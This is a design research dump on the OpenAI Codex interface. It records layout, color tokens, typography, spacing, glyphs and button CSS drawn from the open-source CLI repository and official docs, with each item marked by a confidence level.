# OpenAI Codex — UI/UX Parity Research (raw evidence dump)

**Compiled:** 2026-07-28
**Purpose:** evidence-backed design reference of the OpenAI Codex interface (desktop app, CLI TUI, IDE extension) for a parity migration.

## How to read this document

Every item carries a confidence marker:

- **[verified]** — read directly from a primary source (source code in `openai/codex`, an official docs page, or an official changelog entry). URL / file path given.
- **[inferred]** — a reasonable deduction from a primary source, but not stated outright.
- **[unknown]** — could not confirm; listed in "GAPS I COULD NOT VERIFY".

### Primary evidence base

The single richest source is the **open-source `openai/codex` repository**, which contains the full Rust source of the Codex CLI TUI, including snapshot tests (`insta` `.snap` files) that contain **literal rendered terminal output**. These are ground truth for glyphs, copy, layout, and truncation behaviour.

| Fact | Value |
|---|---|
| Repo | https://github.com/openai/codex |
| Clone HEAD used | `4d1f66bf8199713e4a77ad55458bc6e3dcbef5c5` — "Preserve paginated thread metadata across resumes (#35678)", **2026-07-27** |
| Latest stable release at time of writing | `rust-v0.145.0` (2026-07-21) |
| Latest pre-release | `rust-v0.146.0-alpha.13` (2026-07-27) |
| TUI crate | `codex-rs/tui/` |
| Snapshot count in TUI crate | 613 `.snap` files |

> **[verified]** All file paths below of the form `codex-rs/...` are paths inside https://github.com/openai/codex at that commit.

### Critical caveat on scope

The **desktop app itself (the Electron "command center") is NOT open source.** The repo contains the CLI TUI, the `codex-app-server` (JSON-RPC backend the desktop app and IDE extension both drive), and *fragments of the app's presentation contract* (see §10.11 on `::code-comment` / `::git-*` directives, and §3.1 on `visualize.css`). Everything marked as "desktop app" below is either from official docs, third-party review, or one of those contract fragments — and is marked accordingly.

---

# 1. Layout & shell

## 1.1 Desktop app (Electron)

- **[verified]** The Codex app is described by OpenAI as a **"command center for complex work"** — https://learn.chatgpt.com/docs/app (the `developers.openai.com/codex/app` URL 308-redirects to `learn.chatgpt.com/docs/app`).
- **[verified]** Docs surface these first-class capabilities on that page: *"Move between projects and long-running work without losing context"*, *"Open documents, spreadsheets, images, and other files in the same workspace"*, and a **Chat / Work** mode toggle. Sub-pages referenced: `/codex/projects` ("Organize work with projects"), `/codex/artifacts-viewer` ("Create and inspect files"). — https://learn.chatgpt.com/docs/app
- **[verified]** The desktop app is reachable from the CLI: `/app` slash command = *"continue this session in the Desktop app"* (`codex-rs/tui/src/slash_command.rs:96`). On success the CLI prints **"Opened this session in the Desktop app."** (`codex-rs/tui/src/app/history_ui.rs:8`).
- **[verified]** Desktop app is **macOS and Windows only**: error string *"The Desktop app is only available on macOS and Windows"* (`codex-rs/tui/src/app/history_ui.rs:278`). Launch on Windows goes through a PowerShell shim resolving an AppX package + `codex` protocol handler (`history_ui.rs:208-262`), on macOS through an `.app` bundle.
- **[verified]** Landing page / marketing URL embedded in the CLI tooltip rotation: `https://chatgpt.com/codex?app-landing-page=true`. Exact tooltip strings (`codex-rs/tui/src/tooltips.rs:12,15`):
  - `"Try the **Desktop app**. Run 'codex app' or visit https://chatgpt.com/codex?app-landing-page=true"`
  - `"*New* Build faster with the **Desktop app**. Run 'codex app' or visit https://chatgpt.com/codex?app-landing-page=true"`
- **[verified]** Third-party review consensus (see §11 sources): Electron app that "looks and feels like an IDE", with a **project sidebar**, **threads list**, a **built-in terminal**, and a **code review panel**; a **right sidebar showing code diffs and uncommitted changes**; **collapsible sidebar sections**; **tray usage-limit surfacing**; and a **command-palette theme switcher**.
- **[verified]** GitHub issue `openai/codex#16415` — *"Add an always-expand-all inspection mode in the desktop app thread UI"* — confirms that in the desktop app **tool calls in the thread are collapsed by default** and there is (as of that issue) no global expand-all; the diff sidebar is explicitly called out as *"good for reviewing resulting changes"* but *"not the same as a fully expanded working transcript."* — https://github.com/openai/codex/issues/16415
- **[verified]** The app has a dedicated **Code review** surface documented at https://developers.openai.com/codex/app/review/ (→ `learn.chatgpt.com`).
- **[inferred]** Parallel tasks: the CLI's multi-agent model (§1.3) is served by the same `app-server` protocol, and the app-server exposes *descendant threads* and *fork history through a specific turn* (release notes `rust-v0.143.0`, #30291/#29591/#30277). So the app's parallel-task list is thread-shaped, not process-shaped.
- **[unknown]** Exact pane geometry, default split ratios, min/max widths, tab model (are threads tabs or list rows?), whether the right panel is a stack of tabs (Diff / Terminal / Browser) or separate toggles.

## 1.2 CLI TUI shell — verified layout

The TUI is a **single-column, inline (scrollback-preserving) transcript** with a **bottom pane**. There is no sidebar. **[verified]** `codex-rs/tui/src/chatwidget.rs`, `bottom_pane/mod.rs`.

Vertical stack, top → bottom:

```
  <session header card>            (once, at start)
  <transcript history cells>       (streams into terminal scrollback)
  <live/active cell>               (the in-flight tool call)
  <status indicator row>           • Working (0s • esc to interrupt)
  <composer>                       › Ask Codex to do anything
  <footer>                         ? for shortcuts        100% context left
```

**[verified]** Literal render (`codex-rs/tui/src/chatwidget/snapshots/codex_tui__chatwidget__tests__status_widget_active.snap`):

```
                                                                                
• Analyzing (0s • esc to interrupt)                                             
                                                                                
                                                                                
› Ask Codex to do anything                                                      
                                                                                
  gpt-5.6-sol default · /tmp/project                                            
```

**[verified]** Full-frame example with an exec cell (`..._chatwidget_exec_and_status_layout_vt100_snapshot.snap`):

```
• I'm going to search the repo for where "Change Approved" is rendered to update
  that view.

• Explored
  └ Search Change Approved
    Read diff_render.rs

• Investigating rendering code (0s • esc to interrupt)


› Summarize recent commits

  tab to queue message                                       100% context left
```

### Left gutter contract
- **[verified]** `LIVE_PREFIX_COLS = 2` — every live cell, status row, and composer reserves exactly **2 columns** of left gutter. `FOOTER_INDENT_COLS = LIVE_PREFIX_COLS`. Source: `codex-rs/tui/src/ui_consts.rs:10-11`.
- **[verified]** `TRANSCRIPT_HINT = "ctrl + t to view transcript"` (`ui_consts.rs:12`) — appended to every truncation ellipsis.

### Alternate screen / inline mode
- **[verified]** Config `tui.alternate_screen`: `auto` (default, uses alt screen) | `always` | `never` (inline mode only, preserves scrollback). Source: `codex-rs/config/src/types.rs`.
- **[verified]** Config `tui.raw_output_mode` (default `false`) — "raw scrollback mode for copy-friendly transcript output". Toggled at runtime; snapshot `..._raw_mode_toggle_transcript.snap` shows rich mode → raw markdown → rich mode round trip.

### Transcript overlay (the CLI's "expand all")
- **[verified]** `ctrl+t` opens a full-screen pager overlay titled literally **`T R A N S C R I P T`** (letter-spaced) — `codex-rs/tui/src/pager_overlay.rs:482`.
- **[verified]** Overlay footer hint pairs: `"to scroll"`, `"to page"`, `"to jump"`, `"to quit"`, `"to edit prev"`, `"to edit next"`, `"to edit message"` (`pager_overlay.rs:745-777`).
- **[verified]** This is the mechanism by which truncated content is revealed — the transcript view shows the *untruncated* form of every cell (`HistoryCell::transcript_lines()` vs `display_lines()`).

## 1.3 Multi-agent / parallel work (CLI)

- **[verified]** Agent thread labels render as `Name [role]`, e.g. `"Robie [explorer]"`, `"Banach [worker]"`, `"Main [default]"` (`codex-rs/tui/src/multi_agents.rs:90`, `bottom_pane/approval_overlay.rs:1462`).
- **[verified]** Agent status vocabulary + colors (`multi_agents.rs:628-656`):

| Status | Label | Style |
|---|---|---|
| PendingInit | `Pending init` | cyan |
| Running | `Running` | cyan **bold** |
| Interrupted | `Interrupted` | yellow |
| Completed | `Completed` | green |
| Errored | `Error` / `Agent errored` | red |
| Shutdown | `Shutdown` | default |
| NotFound | `Not found` | red |

- **[verified]** Empty state for the agent list: **`"No agents completed yet"`** (`multi_agents.rs:590`).
- **[verified]** Collab lifecycle event titles: `Spawned`, `Sent input to`, `Waiting for`, `Waiting for agents`, `Waiting for {n} agents`, `Finished waiting`, `Closed`, `Resuming`, `Resumed`, `Agent spawn failed`, `Agent resume failed` (`multi_agents.rs:255-453`).
- **[verified]** Sub-agent activity lines: `` Started `{agent_path}` ``, `` Interacted with `{agent_path}` ``, `` Interrupted `{agent_path}` `` (`multi_agents.rs:318-320`).
- **[verified]** Cross-thread approvals show a `Thread:` header and gain an extra footer verb — `"Press enter to confirm or esc to cancel or o to open thread"` (snapshot `..._approval_overlay_cross_thread_prompt.snap`).

## 1.4 Session header card (CLI)

**[verified]** `codex-rs/tui/src/history_cell/snapshots/..._session_header_indicates_yolo_mode.snap`:

```
╭───────────────────────────────────────╮
│ >_ OpenAI Codex (vtest)               │
│                                       │
│ model:       gpt-5   /model to change │
│ directory:   /tmp/project             │
│ permissions: YOLO mode                │
╰───────────────────────────────────────╯
```

- **[verified]** Rounded box-drawing border (`╭ ╮ ╰ ╯ │ ─`), brand mark is the ASCII glyph **`>_`** followed by `OpenAI Codex (v{version})`.
- **[verified]** Label column is padded to align values; inline affordance hint `/model to change` sits to the right of the value.
- **[verified]** The `permissions:` row is **omitted** in the default case and shown only for non-default modes (compare `..._session_info_availability_nux_tooltip_snapshot.snap`, which has no permissions row).
- **[verified]** A tip line renders below the card, 2-space indented, e.g. `  Tip: Model just became available`.

---

# 2. Typography

## 2.1 Desktop app / web-rendered surfaces

The repo ships OpenAI's actual CSS token contract for agent-authored HTML rendered inside Codex surfaces: `codex-rs/tui/src/inline_visualization/assets/visualize.css`. The file header comment says **"Agent-facing contract; keep in sync with SKILL.md."** This is the closest public artifact to the Codex/ChatGPT design system.

**[verified]** Font stacks (`visualize.css:39-42`):

```css
--font-sans: -apple-system, system-ui, "Segoe UI", sans-serif;
--font-mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas,
             "Liberation Mono", monospace;
```

**[verified]** Type scale (`visualize.css:30, 43-53`):

| Token | Value | Computed @ base 14px |
|---|---|---|
| `--font-size-base` | `14px` | 14px |
| `--font-size-normal` | `max(11px, var(--font-size-base))` | 14px |
| `--font-size-tooltip` | `calc(base - 1px)` | 13px |
| `--font-size-small` | `max(11px, calc(base - 2px))` | 12px |
| `--font-size-h3` | `normal * 1.2857142857` | 18px |
| `--font-size-h2` | `normal * 1.4285714286` | 20px |
| `--font-size-h1` | `normal * 1.7142857143` | 24px |

**[verified]** Weights — note the **non-standard body weight of 430** (a variable-font optical tweak):

```css
--font-weight-normal: 430;
--font-weight-medium: 500;
```

`b`, `strong`, `th` → `500`. Headings h1–h6 → `500`. Table `caption`/`thead th` → `600` (the only 600 in the file). Source: `visualize.css:49-50, 126-151, 198-200`.

**[verified]** Line heights (`visualize.css:51-53`):

```css
--line-height-normal:  calc(var(--font-size-normal) * 1.5);      /* 21px @14 */
--line-height-tooltip: calc(var(--font-size-tooltip) * 1.4285…); /* ~18.6px */
--line-height-small:   calc(var(--font-size-small) + 4px);       /* 16px */
```

Headings: h1/h2 `line-height: 1.25`; h3–h6 `line-height: 1.3`.

**[verified]** Inline code: `font-size: 0.92em`, mono family, `padding: 1px 6px` (`visualize.css:153-165`).
**[verified]** Numeric alignment: right-aligned table cells get `font-variant-numeric: tabular-nums` (`visualize.css:219-222`).
**[verified]** Body text rendering: `-webkit-font-smoothing: antialiased` is applied on `.btn` (`visualize.css:399`).

- **[unknown]** Letter-spacing / tracking values — the file sets none, so tracking is browser default (`normal`) everywhere. No custom `letter-spacing` token exists.
- **[unknown]** Whether the shipping Electron app uses a licensed OpenAI display face (e.g. "OpenAI Sans") rather than `-apple-system`. The visualization sandbox uses system fonts; the chrome may not.

## 2.2 CLI TUI

- **[verified]** Monospace only, inherits the user's terminal font. No font control exists in config (`codex-rs/config/src/types.rs` `Tui` struct has no font field).
- **[verified]** Emphasis is expressed purely via SGR attributes: **BOLD**, *ITALIC*, DIM, UNDERLINE, CROSSED_OUT. See §3.4.

---

# 3. Color

## 3.1 Design tokens (`visualize.css`) — the strongest hex evidence available

**[verified]** `codex-rs/tui/src/inline_visualization/assets/visualize.css:1-77`. Uses CSS `light-dark()` so both themes are in one declaration. Converted to hex below.

| Token | Light | Dark | Notes |
|---|---|---|---|
| `--background` | `rgb(255 255 255)` → **`#FFFFFF`** | `rgb(24 24 24)` → **`#181818`** | page base |
| `--foreground` | `rgb(26 28 31)` → **`#1A1C1F`** | `rgb(255 255 255)` → **`#FFFFFF`** | text primary |
| `--card` | `color-mix(in oklab, var(--foreground) 5%, transparent)` | same formula | **surface elevation = 5% fg over bg** |
| `--card-foreground` | = `--foreground` | = `--foreground` | |
| `--popover` | `rgb(255 255 255)` → **`#FFFFFF`** | `rgb(45 45 45)` → **`#2D2D2D`** | menus/tooltips sit *above* app bg in dark |
| `--popover-foreground` | = `--foreground` | = `--foreground` | |
| `--primary` | `rgb(51 156 255)` → **`#339CFF`** | `rgb(131 195 255)` → **`#83C3FF`** | accent / brand blue |
| `--primary-foreground` | `rgb(255 255 255)` → **`#FFFFFF`** | `rgb(13 13 13)` → **`#0D0D0D`** | on-accent text |
| `--secondary` | `rgb(255 255 255 / 96%)` → **`#FFFFFF` @ 96%** | `rgb(54 54 54 / 96%)` → **`#363636` @ 96%** | control fill |
| `--secondary-foreground` | = `--foreground` | = `--foreground` | |
| `--muted` | `color-mix(in srgb, var(--foreground) 10%, transparent)` | same | **10% fg** — inline-code bg, switch track |
| `--muted-foreground` | `rgb(26 28 31 / 49.4%)` | `rgb(255 255 255 / 49.8%)` | **text secondary ≈ 50% opacity fg** |
| `--accent` | `rgb(229 242 255)` → **`#E5F2FF`** | `rgb(13 39 63)` → **`#0D273F`** | tinted accent surface (badges) |
| `--accent-foreground` | = `--primary` | = `--primary` | |
| `--destructive` | `rgb(226 85 7)` → **`#E25507`** | `rgb(255 133 73)` → **`#FF8549`** | **error/warn is orange, not red** |
| `--border` | `rgb(26 28 31 / 8%)` | `rgb(255 255 255 / 8.2%)` | hairline |
| `--input` | `rgb(26 28 31 / 11.8%)` | `color-mix(in oklab, rgb(0 0 0) 10%, transparent)` | control border |
| `--ring` | `rgb(51 156 255)` → **`#339CFF`** | `rgb(131 195 255 / 76%)` → **`#83C3FF` @ 76%** | focus ring |

**[verified]** Categorical data-viz series (`visualize.css:31-36`):

| Series | Light | Dark |
|---|---|---|
| 1 | = `--primary` **`#339CFF`** | **`#83C3FF`** |
| 2 | `rgb(243 136 59)` **`#F3883B`** | `rgb(245 154 86)` **`#F59A56`** |
| 3 | `rgb(93 201 119)` **`#5DC977`** | `rgb(116 213 139)` **`#74D58B`** |
| 4 | `rgb(235 119 177)` **`#EB77B1`** | `rgb(240 143 192)` **`#F08FC0`** |
| 5 | `rgb(155 121 236)` **`#9B79EC`** | `rgb(170 145 239)` **`#AA91EF`** |
| 6 | `rgb(58 185 177)` **`#3AB9B1`** | `rgb(90 203 194)` **`#5ACBC2`** |

**[verified]** Legacy aliases kept for compatibility (`visualize.css:64-76`): `--viz-panel: var(--card)`, `--viz-border: var(--border)`, `--viz-text: var(--foreground)`, `--viz-muted: var(--muted-foreground)`, `--viz-accent: var(--primary)`, `--viz-warning: var(--destructive)`, `--color-background-primary: var(--background)`, `--color-text-primary: var(--foreground)`, `--color-border-secondary: var(--border)`.

**[verified]** Theme switching mechanism: `:root { color-scheme: light dark }` plus explicit overrides `:root[data-theme="light"] { color-scheme: light }` and `:root[data-theme="dark"] { color-scheme: dark }` (`visualize.css:1, 79-85`). **The app stamps `data-theme` on the root element.**

**[verified]** There is **no elevation shadow system** beyond one token: `--shadow-sm: 0 1px 2px -1px rgb(0 0 0 / 8%)` (`visualize.css:60`). Tooltips explicitly set `box-shadow: none` (`visualize.css:284`). Depth is expressed by **surface tint (`--card` = 5% fg) and hairline borders (8% fg)**, not shadows.

**[verified]** Link color: `color-mix(in srgb, var(--viz-accent) 80%, var(--viz-text) 20%)` — i.e. accent pulled 20% toward text (`visualize.css:103`).

## 3.2 CLI TUI — adaptive, not fixed

**[verified]** The TUI deliberately does **not** ship a fixed palette. It queries the terminal's actual background/foreground (`codex-rs/tui/src/terminal_palette.rs`) and derives everything, so it composites correctly on any terminal theme.

- **[verified]** Light/dark detection uses ITU-R BT.601 luma: `y = 0.299r + 0.587g + 0.114b; is_light = y > 128.0` (`codex-rs/tui/src/color.rs:1-5`).
- **[verified]** Perceptual color matching uses CIE76 ΔE in Lab space via sRGB→linear→XYZ (D65)→Lab (`color.rs:16-75`). Used to snap RGB to the nearest ANSI-256 index when truecolor is unavailable.
- **[verified]** **User message background** (`codex-rs/tui/src/style.rs:80-87`):
  - light terminal → blend **black at α 0.04** over terminal bg
  - dark terminal → blend **white at α 0.12** over terminal bg
  - `proposed_plan_bg` is identical to `user_message_bg` (`style.rs:90-92`).
- **[verified]** **Accent style** (`style.rs:51-57`):
  - dark or unknown bg → `Color::Cyan`, **bold**
  - light bg → RGB **`(0, 95, 135)` = `#005F87`**, **bold** (`LIGHT_BG_ACCENT_RGB`, `style.rs:13`)
- **[verified]** **Table separator rule**: fg blended over bg at **α 0.20** (`TABLE_SEPARATOR_FG_ALPHA`, `style.rs:15`). Tests pin the results: white-on-black → `rgb(51,51,51)` = **`#333333`**; black-on-white → `rgb(204,204,204)` = **`#CCCCCC`** (`style.rs:124, 135`).
- **[verified]** Degradation ladder `StdoutColorLevel`: `TrueColor` → `Ansi256` → `Ansi16` → `Unknown`. At Ansi16/Unknown, tinted backgrounds are dropped entirely and only `DIM`/`BOLD`/named-16 foregrounds are used.

## 3.3 Diff colors — exact hex, both themes

**[verified]** `codex-rs/tui/src/diff_render.rs:63-78`. These are the only hardcoded hex values in the TUI and they are **GitHub's diff palette**.

```rust
const DARK_TC_ADD_LINE_BG_RGB:  (u8,u8,u8) = (33, 58, 43);    // #213A2B
const DARK_TC_DEL_LINE_BG_RGB:  (u8,u8,u8) = (74, 34, 29);    // #4A221D
const LIGHT_TC_ADD_LINE_BG_RGB: (u8,u8,u8) = (218, 251, 225); // #dafbe1
const LIGHT_TC_DEL_LINE_BG_RGB: (u8,u8,u8) = (255, 235, 233); // #ffebe9
const LIGHT_TC_ADD_NUM_BG_RGB:  (u8,u8,u8) = (172, 238, 187); // #aceebb
const LIGHT_TC_DEL_NUM_BG_RGB:  (u8,u8,u8) = (255, 206, 203); // #ffcecb
const LIGHT_TC_GUTTER_FG_RGB:   (u8,u8,u8) = (31, 35, 40);    // #1f2328

const DARK_256_ADD_LINE_BG_IDX:  u8 = 22;
const DARK_256_DEL_LINE_BG_IDX:  u8 = 52;
const LIGHT_256_ADD_LINE_BG_IDX: u8 = 194;
const LIGHT_256_DEL_LINE_BG_IDX: u8 = 224;
const LIGHT_256_ADD_NUM_BG_IDX:  u8 = 157;
const LIGHT_256_DEL_NUM_BG_IDX:  u8 = 217;
const LIGHT_256_GUTTER_FG_IDX:   u8 = 236;
```

**[verified]** Rules for applying them (`diff_render.rs:1151-1315`):

| Context | Add line | Del line |
|---|---|---|
| Dark, truecolor/256 | fg `Green` + bg `#213A2B` | fg `Red` + bg `#4A221D` |
| Light, truecolor/256 | bg `#dafbe1`, **default fg** (no green fg — pastel carries it) | bg `#ffebe9`, default fg |
| Ansi16 (any theme) | fg `Green` only, **no background** | fg `Red` only, no background |
| Sign char `+` / `-` — dark | inherits full add/del style | inherits full del style |
| Sign char `+` / `-` — light | **fg `Green` only**, line bg shows through | **fg `Red` only** |
| Line-number gutter — dark | `Modifier::DIM` | `Modifier::DIM` |
| Line-number gutter — light | fg `#1f2328` on bg `#aceebb` | fg `#1f2328` on bg `#ffcecb` |

**[verified]** These hardcoded values are **fallbacks**. If the active syntax theme defines `markup.inserted` / `markup.deleted` (or `diff.*`) scope backgrounds, those **override** the fallbacks — the fallback is always the baseline and theme scopes are strictly additive (`diff_render.rs:227-250`, `resolve_diff_backgrounds_for`).

**[verified]** Dark is the safe default when the terminal background cannot be probed (`diff_render.rs:117-121`).

## 3.4 Semantic colors in the TUI (glyph + color pairs)

**[verified]** Grep of `codex-rs/tui/src/history_cell/*.rs`:

| Meaning | Glyph | Color | Source |
|---|---|---|---|
| Tool call succeeded | `•` | **green, bold** | `exec_cell/render.rs:361`, `history_cell/mcp.rs:123` |
| Tool call failed | `•` | **red, bold** | `exec_cell/render.rs:362`, `mcp.rs:124` |
| Tool call running | `•` | shimmering (see §8) | `exec_cell/render.rs:363` |
| Tool call idle / neutral | `•` | **dim** | `exec_cell/render.rs:261` |
| Approval granted | `✔ ` | **green** | `history_cell/approvals.rs:72,75,90,117,120,139,320` |
| Approval denied / failure | `✗ ` | **red** | `approvals.rs:148,189,192,217,220,245,248,298,310,340,352` |
| Warning | `⚠ ` | **yellow** (and `⚠ ` **red bold** for fatal summaries) | `history_cell/notices.rs:85, 182` |
| Hard error event | `■ ` | **red** | `history_cell/notices.rs:217` |
| Info / policy block | `ⓘ ` | default | snapshot `..._safety_access_block_event_snapshot.snap` |
| Info line | `• ` | **dim** | `notices.rs:204` |
| Plan step done | `✔ ` | **crossed_out + dim** | `history_cell/plans.rs:188` |
| Plan step pending | `□ ` | default | snapshot `..._plan_update_with_note_and_wrapping_snapshot.snap` |
| Hook running | `•` | default | `history_cell/hook_cell.rs:822` |
| Hook completed | `•` | **green bold** | `hook_cell.rs:818` |
| Hook blocked/failed/stopped | `•` | **red bold** | `hook_cell.rs:821` |
| User message prefix | `› ` | **bold + dim** | `history_cell/messages.rs:191` |
| Exec exit-code failure (transcript) | `✗` | **red bold**, then ` (1)` plain, then ` • 0ms` dim | `exec_cell/snapshots/..._truncated_live_output_preview_and_transcript.snap` |

**[verified]** Exploring sub-verbs (`Read`, `List`, `Search`, `Run`) render **cyan** (`exec_cell/render.rs:336`: `title.cyan()`).

**[verified]** Markdown token styles (`codex-rs/tui/src/markdown_render.rs:111-124`):

```rust
h1: bold + underlined
h2: bold
h3: bold + italic
h4/h5/h6: italic
code: cyan
emphasis: italic
strong: bold
strikethrough: crossed_out
ordered_list_marker: light_blue
unordered_list_marker: (default)
link: cyan + underlined
blockquote: green      // rendered with a "> " prefix, markdown_render.rs:637
```

## 3.5 Syntax highlighting

- **[verified]** Engine: `syntect` 5 + `two-face` 0.5 → **~250 languages, 32 bundled themes** (`codex-rs/tui/src/render/highlight.rs:3-4`, `codex-rs/tui/Cargo.toml:115-116`).
- **[verified]** **Adaptive default theme** (`highlight.rs:190-197`):
  - terminal bg is light → **`catppuccin-latte`**
  - otherwise → **`catppuccin-mocha`**
- **[verified]** Full bundled theme list, kebab-case (`highlight.rs:141-178`): `ansi`, `base16`, `base16-eighties-dark`, `base16-mocha-dark`, `base16-ocean-dark`, `base16-ocean-light`, `base16-256`, `catppuccin-frappe`, `catppuccin-latte`, `catppuccin-macchiato`, `catppuccin-mocha`, `coldark-cold`, `coldark-dark`, `dark-neon`, `dracula`, `github`, `gruvbox-dark`, `gruvbox-light`, `inspired-github`, `1337`, `monokai-extended`, `monokai-extended-bright`, `monokai-extended-light`, `monokai-extended-origin`, `nord`, `one-half-dark`, `one-half-light`, `solarized-dark`, `solarized-light`, `sublime-snazzy`, `two-dark`, `zenburn`.
- **[verified]** Custom themes: drop a `.tmTheme` at `{CODEX_HOME}/themes/{name}.tmTheme` and set `[tui] theme = "name"` (`highlight.rs:112-137`, `theme_picker.rs:11-12`).
- **[verified]** Theme error copy (`highlight.rs:128-137`), quote verbatim:
  - `Custom theme "{name}" at {path} could not be loaded (invalid .tmTheme format). Falling back to the default theme.`
  - `Theme "{name}" not found. Using the default theme. To use a custom theme, place a .tmTheme file at {path}.`
- **[verified]** Observed Catppuccin-Mocha spans in committed snapshots confirm the default: `Rgb(205,214,244)` = **`#CDD6F4`** (text), `Rgb(137,180,250)` = **`#89B4FA`** (blue — command name), `Rgb(147,153,178)` = **`#9399B2`** (overlay2 — comments), `Rgb(249,226,175)` = **`#F9E2AF`** (yellow), `Rgb(203,166,247)` = **`#CBA6F7`** (mauve).
- **[verified]** `$ ` shell prompt prefix in the transcript renders **magenta** (`exec_cell/snapshots/..._truncated_live_output_preview_and_transcript.snap`).

---

# 4. Spacing & radii

## 4.1 Web/app surfaces — exact values

**[verified]** `visualize.css:54-59`:

```css
--radius:        12.5px;                       /* the base */
--radius-sm:     calc(var(--radius) * 0.6);    /*  7.5px */
--radius-md:     calc(var(--radius) * 0.8);    /* 10px   */
--radius-lg:     var(--radius);                /* 12.5px */
--radius-2xl:    calc(var(--radius) * 1.6);    /* 20px   */
--radius-full:   9999px;
```

**[verified] — the signature detail:** every rounded surface also declares

```css
corner-shape: superellipse(1.5);
```

i.e. **squircle corners, not circular arcs**. Applied to: `.card`, `.tooltip`, `.btn`, `.form-control`, `.form-select`, checkbox, color swatch, inline `code`. (`visualize.css:157, 247, 281, 391, 471, 516, 547, 596`.)

**[verified]** Radius assignment by component:

| Component | Radius |
|---|---|
| Card / panel | `--radius-2xl` = **20px** |
| Button, input, select, tooltip | `--radius-lg` = **12.5px** |
| Inline `code`, checkbox | `--radius-sm` = **7.5px** |
| Color swatch inner | `calc(--radius-lg - 4px)` = 8.5px |
| Badge, radio, switch, range thumb | `--radius-full` |

**[verified]** Spacing values in use (`visualize.css`):

| Context | Value |
|---|---|
| Page body padding | `5px` |
| Widget root vertical gap | `12px` |
| Card padding | `12px` |
| Tooltip padding | `4px 8px` |
| Button / input / select padding-inline | `8px` (select right pad `32px` for the caret) |
| Textarea padding | `8px 10px` |
| Grid gap (`.viz-grid`) | `10px` |
| Row gap (`.viz-row`) | `10px` |
| Controls gap (`.viz-controls`) | `8px` |
| Button internal gap | `4px` |
| Stat stack gap | `2px` |
| Checkbox row gap | `6px` |
| Label bottom margin | `6px` |
| Badge padding | `3px 8px` |
| Table cell padding-block | `10px` (`.table-sm` → `6px`); thead `8px` |
| Table cell padding-inline | `0 24px` (`.table-sm` non-last → `16px`) |
| Focus outline offset | `2px` |

**[verified]** Control heights: **`min-height: 28px`** for `.btn`, `.form-control`, `.form-select`, `.form-range`; `.form-check` row `min-height: 20px`; checkbox/radio `14×14px`; switch `32×20px` with a `16×16px` thumb; range thumb `20×20px`; file-selector button `26px`.

**[verified]** Grid: `.viz-grid` = `repeat(auto-fit, minmax(max(180px, 24%), 1fr))` — responsive auto-fit, min track 180px or 24%.

**[verified]** Tooltip max width `min(20rem, available, 100vw - 10px)`.

**[inferred]** The 28px control height + 12.5px radius + squircle corners + 4/6/8/10/12/16/20/24 spacing ladder is a **4px base grid with a soft 2px sub-step**.

## 4.2 CLI TUI spacing

**[verified]** Column-based, from `codex-rs/tui/src/exec_cell/render.rs:695-700`:

```rust
const EXEC_DISPLAY_LAYOUT: ExecDisplayLayout = ExecDisplayLayout::new(
    PrefixedBlock::new("  │ ", "  │ "),   // command continuation lines
    /*command_continuation_max_lines*/ 2,
    PrefixedBlock::new("  └ ", "    "),   // output block
    /*output_max_lines*/ 5,
);
```

- **[verified]** Header column 0 = status glyph, column 1 = space, then bold verb, then space, then content.
- **[verified]** Continuation of a multi-line **command**: prefix `"  │ "` (4 cols) on *every* line, capped at **2 lines**.
- **[verified]** **Output** block: first line prefix `"  └ "` (4 cols), subsequent lines `"    "` (4 cols), capped at **5 lines** (`TOOL_CALL_MAX_LINES = 5`, `render.rs:33`); **50 lines** for user-invoked shell (`USER_SHELL_TOOL_CALL_MAX_LINES = 50`, `render.rs:34`).
- **[verified]** Status-indicator details use the same `"  └ "` prefix (`DETAILS_PREFIX`, `status_indicator_widget.rs:36`) and default to **3 lines** (`STATUS_DETAILS_DEFAULT_MAX_LINES = 3`, `:35`).
- **[verified]** Nested content inside `└` blocks indents a further 4 columns (MCP arg wrapping uses 8-space continuation — see snapshots in §10.4).
- **[verified]** Popups cap at **8 visible rows** (`MAX_POPUP_ROWS = 8`, `bottom_pane/popup_consts.rs:13`).
- **[verified]** Theme-picker side-by-side layout thresholds: side panel ≥ **44 cols** and list ≥ **40 cols**, wide preview left inset **2 cols**, frame padding **1** (`theme_picker.rs:16-19, 130-136`).

---

# 5. Iconography

- **[verified] — the single most concrete icon fact:** the app's HTML surface styles **Lucide** icons:
  ```css
  [data-lucide] { stroke-width: 1.6; }
  ```
  `visualize.css:453-455`. So: **Lucide icon set, stroke-width 1.6** (Lucide's default is 2 — Codex thins it).
- **[verified]** SVGs are normalized with `svg { display: block; max-width: 100%; height: auto; }` and `#widget > svg { width: 100% }` (`visualize.css:779-787`).
- **[verified]** The checkmark used inside checkboxes is a **custom inline SVG on a 17×17 viewBox**, applied as a `mask` at **12×12px**, not a Lucide glyph (`visualize.css:61, 618`). Path data is in the file.
- **[verified]** Select caret is drawn with **two 4×4px linear-gradient triangles**, not an icon (`visualize.css:550-557`).
- **[unknown]** Icon sizes used in app chrome (sidebar, toolbar). Only the 12px checkmark mask and 4px caret are pinned.
- **[verified]** CLI iconography is Unicode glyphs only: `• ✔ ✗ ⚠ ■ ⓘ › ↳ └ │ ⋮ □ ─ ╭ ╮ ╰ ╯ ⌥ >_ ◦`. Full mapping in §3.4.

---

# 6. Components

All CSS facts below are **[verified]** from `codex-rs/tui/src/inline_visualization/assets/visualize.css` unless noted.

## 6.1 Buttons

Base `.btn` (`:377-400`):
```css
appearance: button;
display: inline-flex; align-items: center; justify-content: center;
inline-size: fit-content; max-inline-size: 100%;
min-height: 28px; gap: 4px; margin: 0; padding: 0 8px;
-webkit-app-region: no-drag;                 /* ← Electron: buttons are not drag handles */
border: 1px solid var(--input);
border-radius: var(--radius-lg); corner-shape: superellipse(1.5);
color: var(--secondary-foreground); background: var(--secondary);
cursor: var(--cursor-interaction, pointer);
text-align: center; white-space: nowrap; user-select: none;
-webkit-font-smoothing: antialiased;
```

> The `-webkit-app-region: no-drag` declaration is direct proof this stylesheet targets an **Electron** host with a draggable custom titlebar.

Variants:

| Variant | Rule |
|---|---|
| default (secondary) | border `--input`, bg `--secondary` |
| `.btn-primary` | `border-color: transparent; color: var(--primary-foreground); background: var(--foreground)` — **primary button is filled with the FOREGROUND color (black in light, white in dark), not the blue accent** |
| `.btn-ghost` | transparent border + bg, `color: var(--muted-foreground)` |
| `.btn-block` / `.viz-tile` | `inline-size: 100%` |
| `.btn.viz-tile` | `min-width: 0; white-space: normal; overflow-wrap: anywhere` |

States:

| State | Rule |
|---|---|
